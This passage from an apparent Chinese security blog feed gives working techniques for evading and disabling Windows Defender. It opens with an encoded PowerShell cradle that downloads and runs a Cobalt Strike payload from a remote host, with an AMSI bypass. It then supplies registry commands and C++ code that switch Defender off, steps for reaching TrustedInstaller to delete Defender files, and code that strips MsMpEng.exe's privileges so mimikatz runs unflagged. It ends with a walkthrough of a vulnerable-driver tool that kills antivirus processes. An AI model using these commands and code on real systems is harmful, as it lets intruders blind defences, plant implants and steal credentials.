<p>打开cmd或powershell执行如下命令，cs上线成功，没有被核晶拦截</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mypowershell.exe SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>

<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719104136698.png" alt="image-20230719104136698"></p>
<h2 id="Defender环境"><a href="#Defender环境" class="headerlink" title="Defender环境"></a>Defender环境</h2><p>在WindowsDefender环境下按照之前的操作执行会被amsi拦截（360是没有集成amsi的）</p>
<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111801493.png" alt="image-20230719111801493"></p>
<p>因此需加上-s参数来绕过amsi，这样CS就能正常上线了</p>
<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111453899.png" alt="image-20230719111453899"></p>
<p>​		</p>
<p>​		</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/WeakDefender/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着数字技术的日益进步，我们的生活、工作和娱乐越来越依赖于计算机和网络系统。然而，与此同时，恶意软件也日趋猖獗，寻求窃取信息、破坏系统或仅仅为了展现其能力。微软Windows，作为世界上最流行的操作系统，不断受到这些恶意软件的攻击。为了对抗这些潜在的威胁，微软推出了Windows Defender，一款集成于Windows内部的免费反恶意软件工具</p>
<p>本文将深入探讨如何与Windows Defender对抗，以及那些特殊手段是如何被利用来破坏或关闭Defender的。</p>
<h1 id="修改注册表关闭Defender"><a href="#修改注册表关闭Defender" class="headerlink" title="修改注册表关闭Defender"></a>修改注册表关闭Defender</h1><h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p>打开注册表，在<code>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender</code>键下有两个名为<code>DisableAntiSpyware</code>和<code>DisableAntiVirus</code>的值，当着两个值被置为1时表示关闭Windows Defender的反间谍软件和反病毒功能</p>
<p><img src="/WeakDefender/image-20230823121723961.png" alt="image-20230823121723961"></p>
<p><img src="/WeakDefender/image-20230823121730953.png" alt="image-20230823121730953"></p>
<p>​	</p>
<p>启用管理员权限打开cmd，执行如下命令修改注册表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t reg_dword /d 1 /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiVirus /t reg_dword /d 1 /f</span><br></pre></td></tr></table></figure>

<p><img src="/WeakDefender/image-20230823122459298.png" alt="image-20230823122459298"></p>
<p>修改完注册表后还需重启操作系统才算真正的关闭Defender。重启系统后，虽然defender看起来是正常运行的，但是我们上传一个CS马上去它也不会查杀</p>
<img src="WeakDefender/image-20230823122528707.png" alt="image-20230823122528707" style="zoom:67%;" />		



<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置注册表键值的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SetRegistryValue</span><span class="params">(HKEY hRootKey, LPCSTR subKey, LPCSTR valueName, DWORD data)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="comment">// 打开指定的注册表键</span></span><br><span class="line">    LONG result = <span class="built_in">RegOpenKeyEx</span>(hRootKey, subKey, <span class="number">0</span>, KEY_SET_VALUE, &amp;hKey);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;打开注册表键失败: &quot;</span> &lt;&lt; subKey &lt;&lt; <span class="string">&quot; 错误码: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置指定的注册表键值</span></span><br><span class="line">    result = <span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_DWORD, (BYTE*)&amp;data, <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;设置注册表值失败: &quot;</span> &lt;&lt; valueName &lt;&lt; <span class="string">&quot; 错误码: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;SOFTWARE\\Policies\\Microsoft\\Windows Defender&quot;</span>;</span><br><span class="line">    <span class="comment">// 设置两个注册表键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetRegistryValue</span>(HKEY_LOCAL_MACHINE, subKey, <span class="string">&quot;DisableAntiSpyware&quot;</span>, <span class="number">1</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">SetRegistryValue</span>(HKEY_LOCAL_MACHINE, subKey, <span class="string">&quot;DisableAntiVirus&quot;</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;注册表键值设置成功!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;设置注册表键值失败.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Powershell关闭Defender实时保护"><a href="#Powershell关闭Defender实时保护" class="headerlink" title="Powershell关闭Defender实时保护"></a>Powershell关闭Defender实时保护</h1><p>执行如下Powershell命令可以关闭Windows Defender的实时保护</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>

<p><img src="/WeakDefender/image-20230721173120971.png" alt="image-20230721173120971"></p>
<h1 id="提权至Trustedinstaller"><a href="#提权至Trustedinstaller" class="headerlink" title="提权至Trustedinstaller"></a>提权至Trustedinstaller</h1><h2 id="情景分析"><a href="#情景分析" class="headerlink" title="情景分析"></a>情景分析</h2><p>当我们使用system权限尝试删除WindowsDefender的某些核心文件时，会提示权限不足无法删除</p>
<p><img src="/WeakDefender/image-20230624203426837.png" alt="image-20230624203426837">	</p>
<p>这是因为修改WindowsDefender目录里的文件需要<code>TrustedInstaller</code>权限，而我们要做的是将<code>system</code>权限提升至<code>Trustedinstaller</code></p>
<img src="WeakDefender/image-20230625204420202.png" alt="image-20230625204420202" style="zoom:67%;" />	



<h2 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h2><p>使用开源的项目<a href="https://github.com/0xbadjuju/Tokenvator">Tokenvator</a>将system权限提升至TrustedInstaller权限，执行如下命令后会弹出一个cmd shell, 查询其所在组可以发现权限为TrustedInstaller</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Tokenvator.exe</span><br><span class="line">GetTrustedinstaller /Command:c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/WeakDefender/image-20230624204822742.png" alt="image-20230624204822742"></p>
<p>提升至Trustedinstaller权限后即可删除windowsdefender的核心文件</p>
<p><img src="/WeakDefender/image-20230624205722520.png" alt="image-20230624205722520"></p>
<h1 id="摘除Defender令牌"><a href="#摘除Defender令牌" class="headerlink" title="摘除Defender令牌"></a>摘除Defender令牌</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p><code>MsMpEng.exe</code> 是 Microsoft Windows Defender 的核心进程，Windows Defender 是 Windows 操作系统自带的反病毒软件。此进程名称代表 Microsoft Malware Protection Engine，它负责在你的计算机上扫描、检测和移除恶意软件，通常此进程是加了PPL保护	</p>
<p><img src="/WeakDefender/image-20230624203033735.png" alt="image-20230624203033735"></p>
<p>​		</p>
<p>使用ProcessHacker查看<code>MsmpEng.exe</code>的完整级别为<code>system</code></p>
<blockquote>
<p>在Windows操作系统中，完整性级别是一个安全特性，它被设计用来防止低权限的进程影响高权限的进程。这是通过对进程和对象（如文件或注册表键）分配完整性级别来实现的。如果一个进程试图修改一个具有比其更高完整性级别的对象，操作将会失败</p>
<ul>
<li><strong>Untrusted (0x0000)</strong>: 这是最低的完整性级别，通常不会分配给进程。</li>
<li><strong>Low (0x1000)</strong>: 通常用于Web浏览器和其他可能处理不受信任输入的程序。这可以帮助防止恶意软件通过这些程序蔓延到系统的其它部分。</li>
<li><strong>Medium (0x2000)</strong>: 这是普通用户级别的进程默认的完整性级别。除非另有说明，否则大多数进程将运行在此级别。</li>
<li><strong>High (0x3000)</strong>: 这是管理员级别的进程的默认完整性级别。如果用户以管理员身份运行程序，那么该程序将运行在此级别。</li>
<li><strong>System (0x4000)</strong>: 此级别用于操作系统核心和核心模式驱动程序。</li>
<li><strong>Protected (0x5000)</strong>: 这是Windows 8引入的最高完整性级别，用于保护关键的系统进程。这个级别的进程有防篡改保护，并且只能由具有相同或更高完整性级别的进程访问</li>
</ul>
</blockquote>
<img src="WeakDefender/image-20230624212426260.png" alt="image-20230624212426260" style="zoom:67%;" />			



<p>如果我们将<code>MsmpEng.exe</code>的完整级别降为Untrusted, 那么该进程对计算机资源的访问将十分有限，由于WindowsDefender的核心服务需要某些令牌，降为Untursted级别后这些令牌都会被摘除掉。如下图所示，我将<code>msedge.exe</code>的integrity降为Untrusted后，edge浏览器就无法打开了</p>
<p><img src="/WeakDefender/image-20230624215809411.png" alt="image-20230624215809411">	</p>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-开启Debug权限"><a href="#1-开启Debug权限" class="headerlink" title="1.开启Debug权限"></a>1.开启Debug权限</h3><p>通过<code>EnableDebugPrivilege</code>函数开启当前进程的Debug权限，Debug权限允许进程附加到其他进程上以进行调试，以下是<code>EnableDebugPrivilege</code>函数的定义：</p>
<ul>
<li>调用<code>OpenProcessToken</code>获取传入进程的访问令牌</li>
<li>获取到令牌后，函数调用<code>LookupPrivilegeValue</code>函数以获取<code>SE_DEBUG_NAME</code>特权的本地唯一标识符（LUID）</li>
<li>获取<code>SE_DEBUG_NAME</code>特权的LUID后，函数创建一个<code>TOKEN_PRIVILEGES</code>结构来表示要启用的特权，然后将SE_DEBUG_NAME特权的LUID和启用状态填入到此结构中</li>
<li>调用<code>AdjustTokenPrivileges</code>来调整之前打开的令牌，使其获得<code>SE_DEBUG_NAME</code>特权</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数EnableDebugPrivilege用于启用指定进程的调试权限</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EnableDebugPrivilege</span><span class="params">(HANDLE ProcHandle, HANDLE* hToken)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID sedebugnameValue; <span class="comment">// LUID，用于表示系统特权</span></span><br><span class="line">    TOKEN_PRIVILEGES tkp; <span class="comment">// 令牌特权结构</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开当前进程的访问令牌</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(ProcHandle, TOKEN_ALL_ACCESS |</span><br><span class="line">        TOKEN_QUERY, hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找 SE_DEBUG_NAME 特权的 LUID</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(*hToken); <span class="comment">// 关闭令牌句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置要调整的特权数量</span></span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue; <span class="comment">// 要启用的特权的 LUID</span></span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 启用该特权</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调整访问令牌的特权</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(*hToken, FALSE, &amp;tkp, <span class="built_in">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 返回true表示成功启用调试特权</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-获取system权限的令牌"><a href="#2-获取system权限的令牌" class="headerlink" title="2.获取system权限的令牌"></a>2.获取system权限的令牌</h3><p>通过获取winlogon.exe进程（该进程以SYSTEM账户运行）的令牌并模拟该用户，这是为了获取到比当前用户更高的权限。</p>
<p>调用OpenProcessToken()函数获取winlogon.exe进程的令牌, 再调用ImpersonateLoggedOnUser函数将使用获取到的令牌模拟用户登录，如果成功，那么在此后的代码执行过程中，将使用该令牌所代表的用户权限。这里因为<code>winlogon.exe</code>通常是以SYSTEM用户身份运行的，所以相当于得到了SYSTEM的权限</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wchar_t</span> procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>; <span class="comment">// 目标进程名称</span></span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>(procname); <span class="comment">// 获取目标进程ID</span></span><br><span class="line">HANDLE phandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid); <span class="comment">// 打开目标进程</span></span><br><span class="line"></span><br><span class="line">HANDLE ptoken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &amp;ptoken); <span class="comment">// 获取目标进程的访问令牌</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试以目标用户身份运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ImpersonateLoggedOnUser</span>(ptoken)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(phandle);</span><br><span class="line"><span class="built_in">CloseHandle</span>(ptoken);</span><br></pre></td></tr></table></figure>



<h3 id="3-降低令牌权限"><a href="#3-降低令牌权限" class="headerlink" title="3.降低令牌权限"></a>3.降低令牌权限</h3><p>以下代码的主要目的是获取<code>MsMpEng.exe</code>的句柄，启用该进程的调试特权，并通过<code>SetPrivilege()</code>函数移除<code>MsMpEng.exe</code>的大部分权限，这使得Windows Defender丧失了很多能力，包括加载驱动程序、更改系统环境、备份文件等</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重复上述步骤，但目标进程改为&quot;MsMpEng.exe&quot;</span></span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = <span class="built_in">getpid</span>(procname2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Killing Defender...\n&quot;</span>);</span><br><span class="line">phandle = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">EnableDebugPrivilege</span>(phandle,&amp;ptoken);</span><br><span class="line"><span class="comment">// 以下一系列SetPrivilege调用移除了所有特定的权限</span></span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Removed All Privileges\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-设置进程完整级别为Untrusted"><a href="#4-设置进程完整级别为Untrusted" class="headerlink" title="4.设置进程完整级别为Untrusted"></a>4.设置进程完整级别为Untrusted</h3><p>通过<code>SetTokenInformation()</code>函数将MsMpEng.exe的完整性级别设为Untrusted，这是最低的完整性级别，进一步限制了Windows Defender的能力</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置令牌完整性级别为 Untrusted</span></span><br><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">SetTokenInformation</span>(</span><br><span class="line">    ptoken,</span><br><span class="line">    TokenIntegrityLevel,</span><br><span class="line">    &amp;tokenIntegrityLevel,</span><br><span class="line">    <span class="built_in">sizeof</span>(TOKEN_MANDATORY_LABEL) + <span class="built_in">GetLengthSid</span>(&amp;integrityLevelSid)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SetTokenInformation failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Token Integrity set to Untrusted\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>在WindowsServer2019上，使用管理员权限执行<code>Kill_WindowsDefender.exe</code></p>
<p><img src="/WeakDefender/image-20230624232722573.png" alt="image-20230624232722573">	</p>
<p>随后用ProcespsHacker查看<code>MsMpEng.exe</code>的完整级别, 可以发现变成了<code>Untrusted</code></p>
<p><img src="WeakDefender/image-20230624231758421.png" alt="image-20230624231758421" style="zoom:67%;" />‘	</p>
<p>将WindowsDefender设置为<code>Untrusted</code>级别后，运行mimikatz也不会出现报毒现象</p>
<img src="WeakDefender/image-20230624233443342.png" alt="image-20230624233443342" style="zoom:67%;" />	



<p>但是这种方法只能在WindowsServer服务器上使用，无法在Windows10及以上版本使用</p>
<p><img src="/WeakDefender/image-20230625091215423.png" alt="image-20230625091215423">	</p>
<h1 id="加载驱动关闭Defender-blackout"><a href="#加载驱动关闭Defender-blackout" class="headerlink" title="加载驱动关闭Defender(blackout)"></a>加载驱动关闭Defender(blackout)</h1><h2 id="项目描述"><a href="#项目描述" class="headerlink" title="项目描述"></a>项目描述</h2><p>blackout项目地址：<a href="https://github.com/ZeroMemoryEx/Blackout">https://github.com/ZeroMemoryEx/Blackout</a></p>
<p>Blackout 是一个工具，旨在利用gmer驱动程序来禁用或杀死 EDR 和 AV，特别是那些受到反恶意软件保护的进程。这个工具需要在管理员的上下文中运行，并且可以流畅地绕过 HVCI。</p>
<p>需将驱动程序 <code>Blackout.sys</code> 和可执行文件放于同一路径，随后使用命令 <code>Blackout.exe -p &lt;process_id&gt;</code> 运行</p>
<h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><p>此项目主要涉及两个关键的函数，分别是<code>LoadDriver</code>和<code>DeviceIoControl</code></p>
<p>首先我们来看下<code>LoadDriver</code>函数的定义，其目的是用于加载一个内核驱动。驱动的服务名称被命名为”Blackout”，随后使用<code>CreateServiceA</code> 创建一个新的内核驱动服务，并启动它</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function"><span class="title">LoadDriver</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span>* driverPath</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SC_HANDLE hSCM, hService;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* serviceName = <span class="string">&quot;Blackout&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open a handle to the SCM database</span></span><br><span class="line">    hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if the service already exists</span></span><br><span class="line">    hService = <span class="built_in">OpenServiceA</span>(hSCM, serviceName, SERVICE_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hService != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service already exists.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Start the service if it&#x27;s not running</span></span><br><span class="line">        SERVICE_STATUS serviceStatus;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">QueryServiceStatus</span>(hService, &amp;serviceStatus))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">            <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (serviceStatus.dwCurrentState == SERVICE_STOPPED)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">StartServiceA</span>(hService, <span class="number">0</span>, <span class="literal">nullptr</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">                <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Starting service...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the service</span></span><br><span class="line">    hService = <span class="built_in">CreateServiceA</span>(</span><br><span class="line">        hSCM,</span><br><span class="line">        serviceName,</span><br><span class="line">        serviceName,</span><br><span class="line">        SERVICE_ALL_ACCESS,</span><br><span class="line">        SERVICE_KERNEL_DRIVER,</span><br><span class="line">        SERVICE_DEMAND_START,</span><br><span class="line">        SERVICE_ERROR_IGNORE,</span><br><span class="line">        driverPath,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Service created successfully.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the service</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartServiceA</span>(hService, <span class="number">0</span>, <span class="literal">nullptr</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Starting service...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>其次看下主函数代码的实现流程，先使用前面定义的LoadDriver函数加载驱动，再使用CreateFile打开驱动并得到其句柄。</p>
<p>得到驱动句柄后使用 <code>DeviceIoControl</code> 函数与驱动通信，发送<code>INITIALIZE_IOCTL_CODE</code> 指令初始化驱动，再发送<code>TERMINSTE_PROCESS_IOCTL_CODE</code> 指令来终止指定的进程</p>
<p>如果所给的进程 ID 对应的进程是 “MsMpEng.exe”（这是 Windows Defender 的进程），则程序会不断尝试终止它，毕竟MsMpEng.exe被杀死后还是会无限复活的</p>
<p>在这里我要补充一点，当调用 <code>CreateFile</code> 打开 “\\.\Blackout” 时，实际上是在尝试打开一个与驱动程序相关联的设备。在Windows中，驱动程序可以创建一个设备并为其分配一个符号链接，这样用户模式的程序可以通过这个符号链接与驱动程序通信，从而允许后续的<code>DeviceIoControl</code> 调用来传递IO控制代码 (IOCTL) 和其他数据到驱动程序中</p>
